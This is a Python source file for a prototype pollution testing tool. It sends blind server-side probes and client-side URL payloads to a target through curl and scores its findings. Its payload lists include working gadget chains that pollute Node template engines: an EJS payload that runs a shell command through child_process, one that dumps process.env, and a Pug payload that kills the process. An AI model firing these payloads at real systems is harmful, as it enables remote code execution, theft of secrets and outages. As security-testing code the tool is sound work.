"""Prototype Pollution Tool - Server-side and client-side PP testing.

Dedicated tool for prototype pollution detection and exploitation:
- Server-side PP via JSON body (__proto__, constructor.prototype)
- Server-side blind detection (status code, json spaces, charset probes)
- PP to RCE gadget chain testing (EJS, Pug, Handlebars)
- Client-side PP via URL parameters and query string
- PP scanner that tests all JSON endpoints systematically

Research basis: Gap analysis GAP-7, Doyensec SSPP research, PortSwigger PP labs.
"""

from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from typing import Any

from utils import run_cmd


@dataclass
class PPResult:
    """Result of a prototype pollution test."""
    endpoint: str
    method: str
    payload_type: str  # __proto__, constructor, query_param
    vulnerable: bool
    detection_method: str  # status_change, json_spaces, charset, rce_confirmed
    severity: str
    evidence: str
    gadget_chain: str = ""  # Which RCE gadget was used


# ---------------------------------------------------------------------------
# Server-side blind detection payloads
# ---------------------------------------------------------------------------

SSPP_BLIND_PAYLOADS: list[dict[str, Any]] = [
    {
        "name": "status_code_510",
        "payloads": [
            '{"__proto__": {"status": 510}}',
            '{"constructor": {"prototype": {"status": 510}}}',
        ],
        "detection": "Response status changes to 510",
        "reset_payload": '{"__proto__": {"status": null}}',
        "severity": "high",
    },
    {
        "name": "json_spaces",
        "payloads": [
            '{"__proto__": {"json spaces": "  "}}',
            '{"constructor": {"prototype": {"json spaces": "  "}}}',
        ],
        "detection": "JSON responses become pretty-printed (indented)",
        "reset_payload": '{"__proto__": {"json spaces": null}}',
        "severity": "high",
    },
    {
        "name": "charset_injection",
        "payloads": [
            '{"__proto__": {"content-type": "application/json; charset=utf-7"}}',
        ],
        "detection": "Content-Type header includes injected charset",
        "reset_payload": '{"__proto__": {"content-type": null}}',
        "severity": "high",
    },
    {
        "name": "expose_gc",
        "payloads": [
            '{"__proto__": {"exposedHeaders": ["X-PP-Test"]}}',
        ],
        "detection": "X-PP-Test appears in Access-Control-Expose-Headers",
        "reset_payload": '{"__proto__": {"exposedHeaders": null}}',
        "severity": "high",
    },
]

# ---------------------------------------------------------------------------
# RCE gadget chains
# ---------------------------------------------------------------------------

SSPP_RCE_GADGETS: list[dict[str, Any]] = [
    {
        "name": "ejs_outputFunctionName",
        "engine": "ejs",
        "payload": '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\'child_process\').execSync(\'id > /tmp/pp_test\');x"}}',
        "safe_payload": '{"__proto__": {"outputFunctionName": "x;1;x"}}',
        "detection": "Application error or changed behavior after pollution",
        "severity": "critical",
    },
    {
        "name": "ejs_escape",
        "engine": "ejs",
        "payload": '{"__proto__": {"client": true, "escapeFunction": "1;return process.env//"}}',
        "safe_payload": '{"__proto__": {"client": true, "escapeFunction": "1;return 1//"}}',
        "detection": "Response contains environment variables or error",
        "severity": "critical",
    },
    {
        "name": "pug_pretty",
        "engine": "pug",
        "payload": '{"__proto__": {"block": {"type": "Text", "val": "process.exit()"}}}',
        "safe_payload": '{"__proto__": {"block": {"type": "Text", "val": "1"}}}',
        "detection": "Application crashes or hangs",
        "severity": "critical",
    },
    {
        "name": "handlebars_proto_access",
        "engine": "handlebars",
        "payload": '{"__proto__": {"allowProtoPropertiesByDefault": true, "allowProtoMethodsByDefault": true}}',
        "safe_payload": '{"__proto__": {"allowProtoPropertiesByDefault": true}}',
        "detection": "Template can now access prototype properties",
        "severity": "high",
    },
    {
        "name": "express_qs_parser",
        "engine": "express",
        "payload_url": "?__proto__[polluted]=true",
        "detection": "Check if Object.prototype.polluted is set server-side via reflected values",
        "severity": "high",
    },
]

# ---------------------------------------------------------------------------
# Client-side PP payloads
# ---------------------------------------------------------------------------

CLIENT_PP_PAYLOADS: list[dict[str, Any]] = [
    {
        "name": "url_hash_proto",
        "injection_point": "url_hash",
        "payloads": [
            "#__proto__[polluted]=true",
            "#constructor[prototype][polluted]=true",
        ],
        "detection": "Object.prototype.polluted === true in browser console",
    },
    {
        "name": "query_param_proto",
        "injection_point": "query_param",
        "payloads": [
            "?__proto__[polluted]=true",
            "?constructor[prototype][polluted]=true",
            "?__proto__.polluted=true",
        ],
        "detection": "Object.prototype.polluted === true in browser console",
    },
    {
        "name": "json_body_proto",
        "injection_point": "json_body",
        "payloads": [
            '{"__proto__": {"polluted": "true"}}',
            '{"constructor": {"prototype": {"polluted": "true"}}}',
        ],
        "detection": "Property appears in subsequent API responses",
    },
]


class PrototypePollutionTester:
    """Dedicated prototype pollution tester."""

    def test_sspp_blind(self, url: str, method: str = "POST") -> list[PPResult]:
        """Test for server-side prototype pollution using blind detection.

        Non-destructive probes that detect PP without executing code.
        """
        results: list[PPResult] = []

        # First, get baseline response
        baseline_cmd = f"curl -s -w '\\n%{{http_code}}' -X {method} -H 'Content-Type: application/json' -d '{{\"test\": 1}}' '{url}' --max-time 10"
        try:
            baseline = run_cmd(baseline_cmd)
            baseline_lines = baseline.rsplit("\n", 1)
            baseline_status = baseline_lines[-1].strip() if len(baseline_lines) > 1 else "200"
            baseline_body = baseline_lines[0] if baseline_lines else ""
        except Exception:
            return results

        for probe in SSPP_BLIND_PAYLOADS:
            for payload in probe["payloads"]:
                try:
                    # Send pollution payload
                    cmd = (
                        f"curl -s -w '\\n%{{http_code}}' -X {method} "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{payload}' '{url}' --max-time 10"
                    )
                    result = run_cmd(cmd)
                    result_lines = result.rsplit("\n", 1)
                    result_status = result_lines[-1].strip() if len(result_lines) > 1 else ""
                    result_body = result_lines[0] if result_lines else ""

                    vulnerable = False
                    evidence = ""

                    # Check for status code change
                    if probe["name"] == "status_code_510":
                        # Send a follow-up request to check if status is polluted
                        followup = run_cmd(
                            f"curl -s -o /dev/null -w '%{{http_code}}' '{url}' --max-time 5"
                        )
                        if followup.strip().strip("'") == "510":
                            vulnerable = True
                            evidence = "Status code changed to 510 on follow-up request"

                    # Check for json spaces
                    elif probe["name"] == "json_spaces":
                        followup = run_cmd(
                            f"curl -s '{url}' --max-time 5"
                        )
                        if followup and ("\n " in followup or "\n  " in followup):
                            if "\n " not in baseline_body:
                                vulnerable = True
                                evidence = "JSON response became pretty-printed after pollution"

                    # Check for charset injection
                    elif probe["name"] == "charset_injection":
                        followup = run_cmd(
                            f"curl -s -I '{url}' --max-time 5"
                        )
                        if "utf-7" in followup.lower():
                            vulnerable = True
                            evidence = "Content-Type header now contains injected charset"

                    if vulnerable:
                        results.append(PPResult(
                            endpoint=url,
                            method=method,
                            payload_type="__proto__" if "__proto__" in payload else "constructor",
                            vulnerable=True,
                            detection_method=probe["name"],
                            severity=probe["severity"],
                            evidence=evidence,
                        ))

                        # Try to reset pollution
                        if probe.get("reset_payload"):
                            try:
                                run_cmd(
                                    f"curl -s -X {method} -H 'Content-Type: application/json' "
                                    f"-d '{probe['reset_payload']}' '{url}' --max-time 5"
                                )
                            except Exception:
                                pass

                        break  # One proof per probe type is enough

                except Exception:
                    continue

        return results

    def test_sspp_rce_gadgets(
        self, url: str, method: str = "POST", engine: str = "",
    ) -> list[PPResult]:
        """Test PP to RCE gadget chains (use only after confirming PP exists)."""
        results = []

        for gadget in SSPP_RCE_GADGETS:
            if engine and gadget["engine"] != engine:
                continue

            # Use safe payload first (non-destructive detection)
            safe = gadget.get("safe_payload", "")
            if not safe:
                continue

            try:
                cmd = (
                    f"curl -s -w '\\n%{{http_code}}' -X {method} "
                    f"-H 'Content-Type: application/json' "
                    f"-d '{safe}' '{url}' --max-time 10"
                )
                result = run_cmd(cmd)

                # Check if the application behavior changed
                if "500" in result or "error" in result.lower():
                    results.append(PPResult(
                        endpoint=url,
                        method=method,
                        payload_type="__proto__",
                        vulnerable=True,
                        detection_method="rce_gadget_detected",
                        severity="critical",
                        evidence=f"Safe payload for {gadget['name']} caused error - gadget likely exploitable",
                        gadget_chain=gadget["name"],
                    ))
            except Exception:
                continue

        return results

    def generate_test_configs(self, url: str) -> list[dict[str, Any]]:
        """Generate all PP test configurations for an endpoint."""
        configs = []

        # Blind SSPP tests
        for probe in SSPP_BLIND_PAYLOADS:
            for payload in probe["payloads"]:
                configs.append({
                    "url": url,
                    "method": "POST",
                    "type": "sspp_blind",
                    "probe_name": probe["name"],
                    "payload": payload,
                    "detection": probe["detection"],
                    "severity": probe["severity"],
                })

        # Client-side PP tests
        for client in CLIENT_PP_PAYLOADS:
            for payload in client["payloads"]:
                configs.append({
                    "url": url,
                    "method": "GET",
                    "type": "client_pp",
                    "probe_name": client["name"],
                    "payload": payload,
                    "injection_point": client["injection_point"],
                    "detection": client["detection"],
                })

        return configs

    def generate_hypotheses(self, url: str, tech_stack: dict[str, Any]) -> list[dict[str, Any]]:
        """Generate prototype pollution hypotheses."""
        hypotheses = []
        framework = str(tech_stack.get("framework", "")).lower()

        # Always test SSPP on JSON endpoints
        hypotheses.append({
            "endpoint": url,
            "technique": "sspp_blind_detection",
            "description": "Server-side prototype pollution blind probes (status, json spaces, charset)",
            "novelty": 8, "exploitability": 8, "impact": 9, "effort": 3,
        })

        # Test specific RCE gadgets based on tech stack
        if any(kw in framework for kw in ["express", "node", "next"]):
            hypotheses.append({
                "endpoint": url,
                "technique": "sspp_rce_ejs",
                "description": "SSPP to RCE via EJS outputFunctionName/escapeFunction gadget",
                "novelty": 9, "exploitability": 9, "impact": 10, "effort": 4,
            })
        if "pug" in framework or "jade" in framework:
            hypotheses.append({
                "endpoint": url,
                "technique": "sspp_rce_pug",
                "description": "SSPP to RCE via Pug template engine gadget",
                "novelty": 9, "exploitability": 9, "impact": 10, "effort": 4,
            })

        # Client-side PP
        hypotheses.append({
            "endpoint": url,
            "technique": "client_pp_detection",
            "description": "Client-side prototype pollution via URL params and hash",
            "novelty": 7, "exploitability": 7, "impact": 7, "effort": 2,
        })

        return hypotheses
